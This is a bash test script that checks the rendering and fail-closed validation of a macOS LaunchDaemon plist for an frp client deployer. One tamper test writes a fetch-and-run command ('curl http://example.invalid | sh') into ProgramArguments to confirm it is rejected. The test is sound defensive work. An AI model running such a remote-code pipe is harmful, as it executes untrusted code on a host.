#!/usr/bin/env bash
# LaunchDaemon template and rendering. Portable: rendering is pure plistlib and
# a temp directory, so no launchctl and no macOS host are required.
set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
WORKDIR="$(mktemp -d)"
trap 'rm -rf "$WORKDIR"' EXIT

pass() { echo "PASS $1"; }
fail() { echo "FAIL $1" >&2; exit 1; }

LABEL=com.datarelay.frp-auto-deploy.frpc
TEMPLATE="$ROOT/client/${LABEL}.plist"
STATE='/Library/Application Support/frp-auto-deploy'

[[ -f "$TEMPLATE" ]] || fail "missing launchd template: $TEMPLATE"

# ---------------------------------------------------------------------------
# Template shape
# ---------------------------------------------------------------------------

python3 - "$TEMPLATE" <<'PY'
import plistlib
import sys

with open(sys.argv[1], 'rb') as fh:
    data = plistlib.load(fh)

if data.get('Label') != '@LABEL@':
    raise SystemExit('FAIL template Label must be the @LABEL@ placeholder')
args = data.get('ProgramArguments')
if args != ['@FRPC@', '-c', '@CONFIG@']:
    raise SystemExit('FAIL template ProgramArguments must be @FRPC@ -c @CONFIG@')
if data.get('RunAtLoad') is not True:
    raise SystemExit('FAIL template must set RunAtLoad')
if 'KeepAlive' not in data:
    raise SystemExit('FAIL template must set KeepAlive')
if data.get('StandardOutPath') != '@STDOUT@':
    raise SystemExit('FAIL template must route StandardOutPath')
if data.get('StandardErrorPath') != '@STDERR@':
    raise SystemExit('FAIL template must route StandardErrorPath')
# A LaunchDaemon must never inherit a user-controlled PATH.
env = data.get('EnvironmentVariables') or {}
path = env.get('PATH', '')
for entry in path.split(':'):
    if entry and not entry.startswith('/usr') and not entry.startswith('/bin') \
            and not entry.startswith('/sbin'):
        raise SystemExit('FAIL daemon PATH must contain system directories only: %s' % entry)
PY
pass "template: placeholders, RunAtLoad, KeepAlive, log routing"

# No third-party writable location may appear in the shipped template.
if grep -q '/opt/homebrew' "$TEMPLATE"; then
  fail "template must not reference a Homebrew prefix"
fi
pass "template: no Homebrew prefix"

# ---------------------------------------------------------------------------
# Rendering
# ---------------------------------------------------------------------------

export FRP_TEST_UNAME_S=Darwin
export FRP_CLIENT_TEST_ROOT="$WORKDIR/root"
export FRP_MACOS_PLIST_TEMPLATE="$TEMPLATE"
mkdir -p "$FRP_CLIENT_TEST_ROOT"

# shellcheck source=../lib/frp-common.sh
. "$ROOT/lib/frp-common.sh"

RENDERED="$WORKDIR/rendered.plist"
frp_macos_render_plist "$RENDERED" || fail "rendering the plist should succeed"
[[ -f "$RENDERED" ]] || fail "rendered plist was not written"

EXPECT_FRPC="${FRP_CLIENT_TEST_ROOT}${STATE}/bin/frpc"
EXPECT_CONFIG="${FRP_CLIENT_TEST_ROOT}${STATE}/frpc.toml"
EXPECT_OUT="${FRP_CLIENT_TEST_ROOT}${STATE}/logs/frpc.out.log"
EXPECT_ERR="${FRP_CLIENT_TEST_ROOT}${STATE}/logs/frpc.err.log"

FRP_EXPECT_LABEL="$LABEL" \
FRP_EXPECT_FRPC="$EXPECT_FRPC" \
FRP_EXPECT_CONFIG="$EXPECT_CONFIG" \
FRP_EXPECT_OUT="$EXPECT_OUT" \
FRP_EXPECT_ERR="$EXPECT_ERR" \
python3 - "$RENDERED" <<'PY'
import os
import plistlib
import sys

with open(sys.argv[1], 'rb') as fh:
    data = plistlib.load(fh)

if data.get('Label') != os.environ['FRP_EXPECT_LABEL']:
    raise SystemExit('FAIL rendered Label: %r' % data.get('Label'))
expected_args = [
    os.environ['FRP_EXPECT_FRPC'],
    '-c',
    os.environ['FRP_EXPECT_CONFIG'],
]
if data.get('ProgramArguments') != expected_args:
    raise SystemExit('FAIL rendered ProgramArguments: %r' % (data.get('ProgramArguments'),))
if data.get('StandardOutPath') != os.environ['FRP_EXPECT_OUT']:
    raise SystemExit('FAIL rendered StandardOutPath: %r' % data.get('StandardOutPath'))
if data.get('StandardErrorPath') != os.environ['FRP_EXPECT_ERR']:
    raise SystemExit('FAIL rendered StandardErrorPath: %r' % data.get('StandardErrorPath'))
if data.get('RunAtLoad') is not True:
    raise SystemExit('FAIL rendered plist lost RunAtLoad')
if 'KeepAlive' not in data:
    raise SystemExit('FAIL rendered plist lost KeepAlive')
if '@' in repr(data):
    raise SystemExit('FAIL rendered plist still contains a placeholder')
PY
pass "render: label, frpc invocation, and log paths resolved"

# Logs and the daemon binary must stay under the root-owned state root.
case "$EXPECT_FRPC" in
  *"/Library/Application Support/frp-auto-deploy/bin/frpc") ;;
  *) fail "daemon must exec frpc from the state root, got $EXPECT_FRPC" ;;
esac
pass "render: daemon executes the root-owned frpc"

# ---------------------------------------------------------------------------
# Fail-closed validation
# ---------------------------------------------------------------------------

# A template whose Label was tampered with must not render.
BAD_LABEL="$WORKDIR/bad-label.plist"
python3 - "$TEMPLATE" "$BAD_LABEL" <<'PY'
import plistlib
import sys

with open(sys.argv[1], 'rb') as fh:
    data = plistlib.load(fh)
data['Label'] = 'com.evil.other'
with open(sys.argv[2], 'wb') as fh:
    plistlib.dump(data, fh)
PY
FRP_MACOS_PLIST_TEMPLATE="$BAD_LABEL" \
  frp_macos_render_plist "$WORKDIR/out-bad-label.plist" 2>"$WORKDIR/label.err" \
  && fail "a mismatched Label must be rejected"
grep -q 'Label does not match' "$WORKDIR/label.err" || fail "Label mismatch message"
pass "validate: mismatched Label refused"

# A template whose ProgramArguments were tampered with must not render.
BAD_ARGS="$WORKDIR/bad-args.plist"
python3 - "$TEMPLATE" "$BAD_ARGS" <<'PY'
import plistlib
import sys

with open(sys.argv[1], 'rb') as fh:
    data = plistlib.load(fh)
data['ProgramArguments'] = ['/bin/sh', '-c', 'curl http://example.invalid | sh']
with open(sys.argv[2], 'wb') as fh:
    plistlib.dump(data, fh)
PY
FRP_MACOS_PLIST_TEMPLATE="$BAD_ARGS" \
  frp_macos_render_plist "$WORKDIR/out-bad-args.plist" 2>"$WORKDIR/args.err" \
  && fail "tampered ProgramArguments must be rejected"
grep -q 'not the pinned frpc invocation' "$WORKDIR/args.err" || fail "ProgramArguments message"
pass "validate: tampered ProgramArguments refused"

# Substitution rewrites values, not dictionary keys, so a placeholder used as a
# key is the one way a token can survive expansion. The guard must catch it and
# refuse rather than writing a daemon definition containing a literal @TOKEN@.
BAD_TOKEN="$WORKDIR/bad-token.plist"
python3 - "$TEMPLATE" "$BAD_TOKEN" <<'PY'
import plistlib
import sys

with open(sys.argv[1], 'rb') as fh:
    data = plistlib.load(fh)
data['EnvironmentVariables'] = {'@CONFIG@': '/tmp'}
with open(sys.argv[2], 'wb') as fh:
    plistlib.dump(data, fh)
PY
FRP_MACOS_PLIST_TEMPLATE="$BAD_TOKEN" \
  frp_macos_render_plist "$WORKDIR/out-bad-token.plist" 2>"$WORKDIR/token.err" \
  && fail "an unresolved placeholder must be rejected"
grep -q 'unresolved placeholder' "$WORKDIR/token.err" || fail "unresolved placeholder message"
[[ ! -f "$WORKDIR/out-bad-token.plist" ]] || fail "no plist should be written with a live placeholder"
pass "validate: unresolved placeholders never reach disk"

# An override pointing at a nonexistent file falls back to the shipped template
# rather than rendering nothing.
FRP_MACOS_PLIST_TEMPLATE="$WORKDIR/does-not-exist.plist" \
  frp_macos_render_plist "$WORKDIR/out-fallback.plist" \
  || fail "a stale override should fall back to the shipped template"
[[ -f "$WORKDIR/out-fallback.plist" ]] || fail "fallback render produced no plist"
pass "validate: stale template override falls back to the shipped template"

# With no template reachable at all, rendering is an error, never an empty or
# partial daemon definition.
ISO="$WORKDIR/isolated"
mkdir -p "$ISO/lib"
cp "$ROOT/lib/frp-common.sh" "$ROOT/lib/frp-macos.sh" "$ISO/lib/"
if (
  unset FRP_MACOS_PLIST_TEMPLATE
  # Clear the load guards so the isolated copy really replaces the sourced one.
  unset FRP_COMMON_LOADED FRP_MACOS_LOADED
  # shellcheck disable=SC1091
  . "$ISO/lib/frp-common.sh"
  frp_macos_render_plist "$WORKDIR/out-missing.plist"
) 2>"$WORKDIR/missing.err"; then
  fail "an unreachable template must be rejected"
fi
grep -q 'launchd plist template not found' "$WORKDIR/missing.err" || fail "missing template message"
[[ ! -f "$WORKDIR/out-missing.plist" ]] || fail "no plist should be written without a template"
pass "validate: unreachable template refused"

# ---------------------------------------------------------------------------
# Install destination and manifest wiring
# ---------------------------------------------------------------------------

DEST="$(frp_macos_fs /etc/systemd/system/frpc.service)"
[[ "$DEST" == "${FRP_CLIENT_TEST_ROOT}/Library/LaunchDaemons/${LABEL}.plist" ]] \
  || fail "launchd plist destination: $DEST"
pass "install: plist lands in /Library/LaunchDaemons"

frp_macos_launchd_install || fail "launchd install should render the plist"
[[ -f "$DEST" ]] || fail "installed plist missing at $DEST"
pass "install: frp_macos_launchd_install writes the daemon definition"

# The template must ship with the client so it can be re-rendered after install.
grep -q "client/${LABEL}.plist" "$ROOT/lib/client-project-files.manifest" \
  || fail "plist template must be in the client project manifest"
grep -q "client/${LABEL}.plist" "$ROOT/scripts/build-bundles.py" \
  || fail "plist template must be embedded in the client bundle"
pass "install: template is shipped in the manifest and the bundle"

# The manifest's unit entry must resolve to the launchd plist on macOS, so
# uninstall removes the daemon definition through the normal managed path.
[[ "$(frp_macos_map_path /etc/systemd/system/frpc.service)" == \
  "/Library/LaunchDaemons/${LABEL}.plist" ]] \
  || fail "manifest unit entry must map to the launchd plist"
pass "install: managed uninstall reaches the launchd plist"

echo
echo "MACOS_LAUNCHD_PLIST_TEST=PASS"
